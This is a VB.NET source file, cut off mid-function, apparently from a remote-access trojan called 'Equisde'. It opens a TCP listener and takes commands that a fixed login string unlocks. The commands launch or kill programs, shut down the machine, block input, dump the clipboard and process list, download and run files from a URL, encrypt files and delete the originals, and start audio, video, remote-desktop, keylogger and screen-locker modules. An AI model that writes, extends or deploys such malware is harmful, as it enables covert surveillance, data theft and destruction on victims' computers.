Imports System.Net.Sockets
Imports System.Threading
Imports System.Net
Imports System.Text
Imports System.IO
Imports System.Runtime.Serialization.Formatters.Binary
Public Class TCPCMDReader
    Dim SERVIDOR As TcpListener
    Dim THREADSERVIDOR As Thread
    Dim PuertoSV As Integer
    Dim PuertoDB As String
    Dim ServerIP As String
    Dim RetroConnect As String
    Dim SeeAllCMD As Boolean
    Dim SaveChats As Boolean
    Dim ConnectedUserList As New ArrayList
    Private Structure NUEVOCLIENTE
        Public SOCKETCLIENTE As Socket
        Public THREADCLIENTE As Thread
        Public MENSAJE As String
    End Structure
    Dim CLIENTES As New Hashtable
    Dim CLIENTEIP As IPEndPoint
    Dim USUARIO As String
    Dim NOMBREPRIVADO As String
    Dim IPPRIVADO As String
    Dim PUERTOPRIVADO As String
    Dim UserCommand As String
    Dim UserLoged As Boolean = False

    Private Sub Main_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load

    End Sub

    Sub Main()
        Try
            PuertoSV = 8080
            'ServerIP =
        Catch ex As Exception
            Console.WriteLine("[Main@Form1_Load(LoadConfig)]Error: " & ex.Message)
        End Try
        Start()
    End Sub

    Sub DiagnosticPosting(ByVal Info As String, ByVal From As String, ByVal Flag As Boolean, ByVal Important As Boolean)
        Try
            Dim broadcastMSG As String
            If Flag = True Then
                If Important = True Then
                    broadcastMSG = "[!]" & "(" & From & ")" & Info
                ElseIf Important = False Then
                    broadcastMSG = "(" & From & ")" & Info
                End If
            ElseIf Flag = False Then
                If Important = True Then
                    broadcastMSG = "[!]" & Info
                ElseIf Important = False Then
                    broadcastMSG = Info
                End If
            End If
            ENVIARTODOS(broadcastMSG)
            msg(vbCrLf & broadcastMSG)
        Catch ex As Exception
            Console.WriteLine("[handleClient@DiagnosticPosting]Error: " & ex.Message)
        End Try
    End Sub

    Sub msg(ByVal message As String)
        message.Trim()
        Console.WriteLine(" >> " + message)
    End Sub

    Sub Start()
        CheckForIllegalCrossThreadCalls = False
        SERVIDOR = New TcpListener(IPAddress.Any, PuertoSV)
        SERVIDOR.Start()
        THREADSERVIDOR = New Thread(AddressOf ESCUCHAR)
        THREADSERVIDOR.Start()
        Console.WriteLine("Equisde TCP Command Reader. Version " & My.Application.Info.Version.ToString)
    End Sub

    Public Sub ESCUCHAR()
        Dim CLIENTE As New NUEVOCLIENTE
        While True
            Try
                CLIENTE.SOCKETCLIENTE = SERVIDOR.AcceptSocket
                CLIENTEIP = CLIENTE.SOCKETCLIENTE.RemoteEndPoint
                CLIENTE.THREADCLIENTE = New Thread(AddressOf LEER)
                CLIENTES.Add(CLIENTEIP, CLIENTE)
                CLIENTE.THREADCLIENTE.Start()
            Catch ex As Exception
            End Try
        End While
    End Sub

    Public Sub LEER()
        Dim CLIENTE As New NUEVOCLIENTE
        Dim DATOS() As Byte
        Dim IP As IPEndPoint = CLIENTEIP
        CLIENTE = CLIENTES(IP)
        While True
            If CLIENTE.SOCKETCLIENTE.Connected Then
                DATOS = New Byte(1024) {}
                Try
                    If CLIENTE.SOCKETCLIENTE.Receive(DATOS, DATOS.Length, 0) > 0 Then
                        CLIENTE.MENSAJE = Encoding.UTF8.GetString(DATOS)
                        CLIENTES(IP) = CLIENTE
                        ACCIONES(IP)
                    Else
                        Exit While
                    End If
                Catch ex As Exception
                    Exit While
                End Try
            End If
        End While
        CERRARTHREAD(IP)
    End Sub

    Private Sub ACCIONES(ByVal IDTerminal As IPEndPoint)
        Dim MENSAJE As String = OBTENERDATOS(IDTerminal)
        USUARIO = MENSAJE.Split(":")(1)
        USUARIO = USUARIO.Trim("")
        If MENSAJE.StartsWith("Conexion:") Then
            ConnectedUserList.Add(USUARIO)
            For I = 0 To ConnectedUserList.Count - 1
                ENVIARTODOS("Lista:" & ConnectedUserList(I) & "/")
            Next
            ENVIARTODOS("Conexion:" & USUARIO)
            If SeeAllCMD = True Then
                msg(vbCrLf & "[" & IDTerminal.ToString & "]Conexion:" & USUARIO)
            End If
            My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\EquisdeVRS_Connections.ini", USUARIO & ":" & IDTerminal.ToString & vbCrLf, True)
        ElseIf MENSAJE.StartsWith("Desconexion:") Then
            ConnectedUserList.Remove(USUARIO)
            Try
                For I = 0 To ConnectedUserList.Count - 1
                    ENVIARTODOS("Lista:" & ConnectedUserList(I) & "/")
                Next
            Catch ex As Exception
            End Try
            ENVIARTODOS("Desconexion:" & USUARIO)
            If SeeAllCMD = True Then
                msg(vbCrLf & MENSAJE)
            End If
            DESCONEXIONES(USUARIO)
        Else
            ENVIARTODOS(MENSAJE)
            msg(vbCrLf & MENSAJE)
        End If
        ReadCommand(MENSAJE)
    End Sub

    Public Function OBTENERDATOS(ByVal IDCliente As IPEndPoint) As String
        Dim CLIENTE As NUEVOCLIENTE
        CLIENTE = CLIENTES(IDCliente)
        Return CLIENTE.MENSAJE
    End Function

    Public Function LOGIN(ByVal CREDENCIALES As String) As Boolean
        Dim IDENTIDAD As String = CREDENCIALES.Remove(0, CREDENCIALES.IndexOf(":") + 1)
        For Each LINEA In IO.File.ReadLines(Application.StartupPath & "\EquisdeVRS_Users.ini")
            Dim NOMBRE As String = LINEA.Split(":")(0)
            Dim CONTRASEÑA As String = LINEA.Split(":")(1)
            Dim LOGINOK As String = NOMBRE & ":" & CONTRASEÑA
            If IDENTIDAD.Trim("") = LOGINOK Then
                Return True
                Exit For
            End If
        Next
        Return False
    End Function

    Public Sub ENVIARUNO(ByVal IDCliente As IPEndPoint, ByVal Datos As String)
        Dim Cliente As NUEVOCLIENTE
        Cliente = CLIENTES(IDCliente)
        Cliente.SOCKETCLIENTE.Send(Encoding.UTF8.GetBytes(Datos))
    End Sub

    Public Sub ENVIARTODOS(ByVal Datos As String)
        Dim CLIENTE As NUEVOCLIENTE
        For Each CLIENTE In CLIENTES.Values
            CLIENTE.SOCKETCLIENTE.Send(Encoding.UTF8.GetBytes(Datos))
        Next
    End Sub

    Public Sub CONEXIONES(ByVal NOMBRE As String)
        Dim RUTA As String = Application.StartupPath & "\EquisdeVRS_Connections.ini"
        Dim LECTOR As New StreamReader(RUTA)
        While LECTOR.EndOfStream = False
            Dim CAPTURA As String = LECTOR.ReadLine
            If CAPTURA.StartsWith(NOMBRE) Then
                IPPRIVADO = CAPTURA
                IPPRIVADO = IPPRIVADO.Remove(0, IPPRIVADO.IndexOf(":") + 1)
                IPPRIVADO = IPPRIVADO.Substring(0, IPPRIVADO.IndexOf(":"))
                PUERTOPRIVADO = CAPTURA
                PUERTOPRIVADO = PUERTOPRIVADO.Remove(0, PUERTOPRIVADO.LastIndexOf(":") + 1)
                Exit While
            End If
        End While
        LECTOR.Close()
    End Sub

    Public Sub DESCONEXIONES(ByVal NOMBRE As String)
        Dim RUTA As String = Application.StartupPath & "\EquisdeVRS_Connections.ini"
        Dim LECTOR As New StreamReader(RUTA)
        Dim NUEVACONEXIONES As New ArrayList
        While LECTOR.EndOfStream = False
            Dim CAPTURA As String = LECTOR.ReadLine
            If CAPTURA.StartsWith(NOMBRE) Then
                NUEVACONEXIONES.Add(LECTOR.ReadToEnd)
                Exit While
            Else
                NUEVACONEXIONES.Add(CAPTURA)
            End If
        End While
        LECTOR.Close()
        My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\EquisdeVRS_Connections.ini", Nothing, False)
        For I = 0 To NUEVACONEXIONES.Count - 1
            My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\EquisdeVRS_Connections.ini", NUEVACONEXIONES(I) & vbCrLf, True)
        Next
    End Sub

    Public Sub CERRARTHREAD(ByVal IP As IPEndPoint)
        Dim CLIENTE As NUEVOCLIENTE = CLIENTES(IP)
        Try
            CLIENTE.THREADCLIENTE.Abort()
        Catch ex As Exception
            CLIENTES.Remove(IP)
        End Try
    End Sub

    Public Sub CERRARTODO()
        Dim CLIENTE As NUEVOCLIENTE
        For Each CLIENTE In CLIENTES.Values
            CLIENTE.SOCKETCLIENTE.Close()
            CLIENTE.THREADCLIENTE.Abort()
        Next
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        ENVIARTODOS("[Servidor]:Desconectado")
        Threading.Thread.Sleep(1000)
        CERRARTODO()
        SERVIDOR.Stop()
        THREADSERVIDOR.Abort()
    End Sub

    Sub broadcastmsg(ByVal mesag As String, ByVal uName As String, ByVal flag As Boolean)
        Try
            Dim broadcastMSG As String
            If mesag.StartsWith("@CMD.") Then
                broadcastMSG = "Comando XD Recibido"
            Else
                If flag = True Then
                    broadcastMSG = uName + " dice: " + mesag
                Else
                    broadcastMSG = mesag
                End If
            End If
            ENVIARTODOS(broadcastMSG)
            msg(vbCrLf & broadcastMSG)
        Catch ex As Exception
            Console.WriteLine("[handleClient@broadcastmsg]Error: " & ex.Message)
        End Try
    End Sub

    Dim SerialKey As String = Nothing
    Dim SolveSerial As String = Nothing
    Dim MaxTime As Integer = 1200000
    Dim MaxTimeAction As String = Nothing
    Sub ReadCommand(ByVal Comando As String)
        Try
            UserCommand = Comando
            'Comandos si el usuario esta logeado
            If UserCommand.ToString.Contains("/Join -XDTCPCMDReader") Then 'Comando para iniciar sesion
                If UserLoged = False Then
                    UserLoged = True
                    broadcastmsg("You have been loged!", "EQUISDE TCP CMD", False)
                Else
                    broadcastmsg("You are already Loged.", "EQUISDE TCP CMD", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Left -XDTCPCMDReader") Then 'Comando para finalizar sesion
                If UserLoged = True Then
                    UserLoged = False
                    broadcastmsg("You have been logout.", "EQUISDE TCP CMD", False)
                Else
                    broadcastmsg("You are not Loged.", "EQUISDE TCP CMD", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Windows.Start.App=") Then 'Comando iniciar programa
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    UserCommand = UserCommand.Replace("/Windows.Start.App=", "")
                    broadcastmsg("Iniciar programa remoto: " & UserCommand, "XDControlPanel", False)
                    Process.Start(UserCommand)
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Windows.Tasks.GetApps()") Then 'Comando obtener programas
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Obtener programas en ejecucion", "XDControlPanel", False)
                    Dim tempString As String = Nothing
                    Dim p As Process
                    For Each p In Process.GetProcesses()
                        If Not p Is Nothing Then
                            tempString = tempString & p.ProcessName & vbCrLf
                        End If
                    Next
                    broadcastmsg("<--- START PROCESSES DUMPDATA --->" & vbCrLf & tempString & vbCrLf & ">--- END PROCESSES DUMPDATA ---<", "XDControlPanel", False)
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Windows.Close.App=") Then 'Comando cerrar programa
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    UserCommand = UserCommand.Replace("/Windows.Close.App=", "")
                    broadcastmsg("Cerrar programa remoto: " & UserCommand, "XDControlPanel", False)
                    For Each P As Process In System.Diagnostics.Process.GetProcessesByName(UserCommand)
                        P.Kill()
                    Next
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Windows.Message.Show=") Then 'Comando mostrar mensaje
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    UserCommand = UserCommand.Replace("/Windows.Message.Show=", "")
                    broadcastmsg("Mostrar mensaje: " & UserCommand, "XDControlPanel", False)
                    MsgBox(UserCommand, MsgBoxStyle.Information, "Microsoft Windows")
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Windows.Shutdown(FORCE)") Then 'Apagar Windows Forzado
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Apagar computador remoto", "XDControlPanel", False)
                    Process.Start("shutdown.exe", "-f -s")
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Windows.Shutdown(PASSIVE)") Then 'Apagar Windows Pasivo
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Apagar computador remoto", "XDControlPanel", False)
                    Process.Start("shutdown.exe", "-h")
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Payloads.ActivateAllPayloads()") Then 'Comandos para activar modulos (Payload)
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Iniciar todas las Paylodas", "XDControlPanel", False)
                    Payloads.ActivateAllPayloads()
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Payloads.BorrarCosillas()") Then 'Comandos para activar modulos (Payload)
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Iniciar payload 'BorrarCosillas'", "XDControlPanel", False)
                    Payloads.BorrarCosillas()
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Payloads.DesconectarConexion()") Then 'Comandos para activar modulos (Payload)
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Iniciar payload 'DesconectarConexion'", "XDControlPanel", False)
                    Payloads.DesconectarConexion()
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Payloads.BlockInput(TRUE)") Then 'Comandos para activar modulos (Payload)
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Iniciar payload 'Inputs'", "XDControlPanel", False)
                    Payloads.Inputs(True)
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Payloads.BlockInput(FALSE)") Then 'Comandos para activar modulos (Payload)
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Iniciar payload 'Inputs'", "XDControlPanel", False)
                    Payloads.Inputs(False)
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Payloads.DownloadSomething=") Then 'Comandos para activar modulos (Payload)
                If UserLoged = True Then
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        UserCommand = UserCommand.Replace("/Payloads.DownloadSomething=", "")
                        Dim TEXTO As String = UserCommand
                        Dim Cadena As String() = TEXTO.Split(">")
                        Dim URL As String
                        Dim Name As String
                        Dim RUN As String
                        Dim Argumentos As String
                        URL = Cadena(0)
                        Name = Cadena(1)
                        RUN = Cadena(2)
                        Argumentos = Cadena(3)
                        broadcastmsg("Iniciar payload 'DownloadSomething(" & URL + Name + RUN + Argumentos & ")'", "XDControlPanel", False)
                        If RUN = "True" Then
                            Payloads.DownloadSomething(URL, Name, True, Argumentos)
                        Else
                            Payloads.DownloadSomething(URL, Name, False, Argumentos)
                        End If
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@Payload]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.AudioTCP.Start()") Then 'Comandos para activar modulos (AudioTCP)
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Iniciar modulo AudioTCPServer", "XDControlPanel", False)
                    Try
                        AudioServer.Show()
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.AudioTCP.Start())]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.VideoTCP.Start()") Then 'Comandos para activar modulos (VideoTCP)
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Iniciar modulo VideoTCPServer", "XDControlPanel", False)
                    Try
                        Try
                            If My.Computer.FileSystem.FileExists(Starter.DIRCommons & "\VideoXDSender.exe") = True Then
                                My.Computer.FileSystem.DeleteFile(Starter.DIRCommons & "\VideoXDSender.exe")
                            End If
                        Catch ex As Exception
                            Console.WriteLine("[handleClient@CMD(/Modules.VideoTCP.Start(DeleteLast))]Error: " & ex.Message)
                        End Try
                        My.Computer.FileSystem.CopyFile(Application.StartupPath & "\Equisde.exe", Starter.DIRCommons & "\VideoXDSender.exe")
                        Try
                            Process.Start(Starter.DIRCommons & "\VideoXDSender.exe", "/TCPCMDVideoSender")
                        Catch ex As Exception
                            Console.WriteLine("[handleClient@CMD(/Modules.VideoTCP.Start(ProcessRunner))]Error: " & ex.Message)
                        End Try
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.VideoTCP.Start())]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.RemoteTCP.Start()") Then 'Comandos para activar modulos (RemoteTCP)
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Iniciar modulo RemoteDesktopTCPServer", "XDControlPanel", False)
                    Try
                        Try
                            If My.Computer.FileSystem.FileExists(Starter.DIRCommons & "\RemoteXDSender.exe") = True Then
                                My.Computer.FileSystem.DeleteFile(Starter.DIRCommons & "\RemoteSender.exe")
                            End If
                        Catch ex As Exception
                            Console.WriteLine("[handleClient@CMD(/Modules.RemoteTCP.Start(DeleteLast))]Error: " & ex.Message)
                        End Try
                        My.Computer.FileSystem.CopyFile(Application.StartupPath & "\Equisde.exe", Starter.DIRCommons & "\RemoteXDSender.exe")
                        Try
                            Process.Start(Starter.DIRCommons & "\RemoteXDSender.exe", "/TCPCMDRemoteSender")
                        Catch ex As Exception
                            Console.WriteLine("[handleClient@CMD(/Modules.RemoteTCP.Start(ProcessRunner))]Error: " & ex.Message)
                        End Try
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.RemoteTCP.Start())]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.Cipher.LockDir=") Then 'Comandos para activar modulos (Cipher.LockDir=)
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Bloquear acceso a carpeta", "XDControlPanel", False)
                    UserCommand = UserCommand.Replace("/Modules.Cipher.LockDir=", "")
                    Cipher.LockDirectory(UserCommand, True)
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.Cipher.UnlockDir=") Then 'Comandos para activar modulos (Cipher.UnlockDir=)
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Desbloquear acceso a carpeta", "XDControlPanel", False)
                    UserCommand = UserCommand.Replace("/Modules.Cipher.UnlockDir=", "")
                    Cipher.UnlockDirectory(UserCommand, True)
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.Cipher.FileEncrypt=") Then 'Comandos para activar modulos (Cipher.FileEncrypt=)
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Encriptar fichero", "XDControlPanel", False)
                    UserCommand = UserCommand.Replace("/Modules.Cipher.FileEncrypt=", "")
                    Cipher.CallFileEncrypt(UserCommand, UserCommand & ".enc")
                    If My.Computer.FileSystem.FileExists(UserCommand) = True Then
                        My.Computer.FileSystem.DeleteFile(UserCommand)
                    End If
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.Cipher.FileDecrypt=") Then 'Comandos para activar modulos (Cipher.FileDecrypt=)
                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Desencriptar fichero", "XDControlPanel", False)
                    UserCommand = UserCommand.Replace("/Modules.Cipher.FileDecrypt=", "")
                    Cipher.CallFileDecrypt(UserCommand, UserCommand & ".den")
                    If My.Computer.FileSystem.FileExists(UserCommand) = True Then
                        My.Computer.FileSystem.DeleteFile(UserCommand)
                    End If
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.TCP.SetIP=") Then 'Comandos para configurar IP en modulos "/Modules.TCP.SetIP="

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    UserCommand = UserCommand.Replace("/Modules.TCP.SetIP=", "")
                    broadcastmsg("Setear IP a los Modulos: " & UserCommand, "XDControlPanel", False)
                    My.Settings.Me_IP = UserCommand
                    My.Settings.Save()
                    My.Settings.Reload()
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/DataBase.Reload()") Then 'Comandos para configurar IP en modulos "/DataBase.Reload()"

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Recargar Base de Datos", "XDControlPanel", False)
                    If My.Computer.FileSystem.FileExists(Starter.DIRCommons & "\DataBase.ini") = True Then
                        My.Computer.FileSystem.DeleteFile(Starter.DIRCommons & "\DataBase.ini")
                    End If
                    My.Computer.FileSystem.WriteAllText(Starter.DIRCommons & "\DataBase.ini", "#EQUISDE VRS CONFIG DATABASE FILE" &
                                                        vbCrLf & "ServerIP>" & My.Settings.Me_IP, False)
                    My.Settings.Reload()
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/DataBase.Reset()") Then 'Comandos para resetear la DB "/DataBase.Reset()"

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Reiniciar Base de Datos", "XDControlPanel", False)
                    If My.Computer.FileSystem.FileExists(Starter.DIRCommons & "\DataBase.ini") = True Then
                        My.Computer.FileSystem.DeleteFile(Starter.DIRCommons & "\DataBase.ini")
                    End If
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.Stop()") Then 'Comandos de Detencion (Detener todo Modulo)

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Detener todos los Modulos", "XDControlPanel", False)
                    Try
                        For Each Video As Process In System.Diagnostics.Process.GetProcessesByName("VideoXDSender")
                            Video.Kill()
                        Next
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.Stop(VideoServer.Close())]Error: " & ex.Message)
                    End Try
                    Try
                        AudioServer.Close()
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.Stop(AudioServer.Close())]Error: " & ex.Message)
                    End Try
                    Try
                        KeyloggerModule.Close()
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.Stop(KeyloggerModule.Close())]Error: " & ex.Message)
                    End Try
                    Try
                        For Each Remote As Process In System.Diagnostics.Process.GetProcessesByName("RemoteXDSender")
                            Remote.Kill()
                        Next
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.Stop(RemoteServer.Close())]Error: " & ex.Message)
                    End Try
                    Try
                        For Each ScreenLocker As Process In System.Diagnostics.Process.GetProcessesByName("ScreenLockerXDKeep")
                            ScreenLocker.Kill()
                        Next
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.Stop(ScreenLocker.Close())]Error: " & ex.Message)
                    End Try
                    Threading.Thread.Sleep(1500)
                    Try
                        Try
                            If My.Computer.FileSystem.FileExists(Starter.DIRCommons & "\RemoteXDSender.exe") = True Then
                                My.Computer.FileSystem.DeleteFile(Starter.DIRCommons & "\RemoteXDSender.exe")
                            End If
                        Catch ex As Exception
                            Console.WriteLine("[Starter@CommonStart(DeleteRemoteExe)]Error: " & ex.Message)
                        End Try
                        Try
                            If My.Computer.FileSystem.FileExists(Starter.DIRCommons & "\VideoXDSender.exe") = True Then
                                My.Computer.FileSystem.DeleteFile(Starter.DIRCommons & "\VideoXDSender.exe")
                            End If
                        Catch ex As Exception
                            Console.WriteLine("[Starter@CommonStart(DeleteVideoExe)]Error: " & ex.Message)
                        End Try
                        Try
                            If My.Computer.FileSystem.FileExists(Starter.DIRCommons & "\ScreenLockerXDKeep.exe") = True Then
                                My.Computer.FileSystem.DeleteFile(Starter.DIRCommons & "\ScreenLockerXDKeep.exe")
                            End If
                        Catch ex As Exception
                            Console.WriteLine("[Starter@CommonStart(DeleteScreenLockerExe)]Error: " & ex.Message)
                        End Try
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.Stop()DeleteExecutables)]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.Remove()") Then 'Resetear ejecutables (Modules.Remove())

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Resetear modulos ejecutables locales", "XDControlPanel", False)
                    Try
                        Try
                            If My.Computer.FileSystem.FileExists(Starter.DIRCommons & "\RemoteXDSender.exe") = True Then
                                My.Computer.FileSystem.DeleteFile(Starter.DIRCommons & "\RemoteXDSender.exe")
                            End If
                        Catch ex As Exception
                            Console.WriteLine("[handleClient@CMD(/Modules.Remove(RemoteXDSender.Close())]Error: " & ex.Message)
                        End Try
                        Try
                            If My.Computer.FileSystem.FileExists(Starter.DIRCommons & "\VideoXDSender.exe") = True Then
                                My.Computer.FileSystem.DeleteFile(Starter.DIRCommons & "\VideoXDSender.exe")
                            End If
                        Catch ex As Exception
                            Console.WriteLine("[handleClient@CMD(/Modules.Remove(VideoXDSender.Close())]Error: " & ex.Message)
                        End Try
                        Try
                            If My.Computer.FileSystem.FileExists(Starter.DIRCommons & "\ScreenLockerXDKeep.exe") = True Then
                                My.Computer.FileSystem.DeleteFile(Starter.DIRCommons & "\ScreenLockerXDKeep.exe")
                            End If
                        Catch ex As Exception
                            Console.WriteLine("[handleClient@CMD(/Modules.Remove(ScreenLockerXDKeep.Close())]Error: " & ex.Message)
                        End Try
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.Remove()DeleteExecutables)]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Stop()") Then 'Comandos de Detencion (Detener todo)

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Servidor cerrado.", "XDControlPanel", False)
                    UserLoged = False

                    'CERRAR TODOOOOO

                    Close()
                    End
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Vaccine()") Then 'Comandos de Detencion (Vacunar)

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("This EquisdeVRS was disabled by the Administrator", "XDControlPanel", False)
                    If My.Computer.FileSystem.FileExists(Starter.DIRCommons & "\ThisIsAVaccine.vcn") = True Then
                        My.Computer.FileSystem.DeleteFile(Starter.DIRCommons & "\ThisIsAVaccine.vcn")
                    End If
                    Try
                        For Each Video As Process In System.Diagnostics.Process.GetProcessesByName("VideoXDSender")
                            Video.Kill()
                        Next
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.Stop(VideoServer.Close())]Error: " & ex.Message)
                    End Try
                    Try
                        AudioServer.Close()
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.Stop(AudioServer.Close())]Error: " & ex.Message)
                    End Try
                    Try
                        For Each Remote As Process In System.Diagnostics.Process.GetProcessesByName("RemoteXDSender")
                            Remote.Kill()
                        Next
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.Stop(RemoteServer.Close())]Error: " & ex.Message)
                    End Try
                    My.Computer.FileSystem.WriteAllText(Starter.DIRCommons & "\ThisIsAVaccine.vcn", "Vaccine.vcn /End, /Vaccine, -Equisde(XD;MAIN{CallStack:CloseWithClue} As EndProcess), /FuckItUp, -XD.Stop", False)
                    End
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Windows.Clipboard.Get()") Then 'Comandos essentials "Clipboard.Get()"

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Obtener todo del Portapapeles", "XDControlPanel", False)
                    broadcastmsg("<--- START CLIPBOARD DUMPDATA --->" & vbCrLf & My.Computer.Clipboard.GetText.ToString & vbCrLf & ">--- END CLIPBOARD DUMPDATA ---<", "XDControlPanel", False)
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Windows.Clipboard.Set=") Then 'Comandos essentials "Clipboard.Set="

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    UserCommand = UserCommand.Replace("/Windows.Clipboard.Set=", "")
                    broadcastmsg("Setear texto en el Portapapeles: " & UserCommand, "XDControlPanel", False)
                    My.Computer.Clipboard.SetText(UserCommand.ToString)
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Windows.FileSystem.GetDirectory(All)") Then 'Comandos essentials "GetDirectory(All)"

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
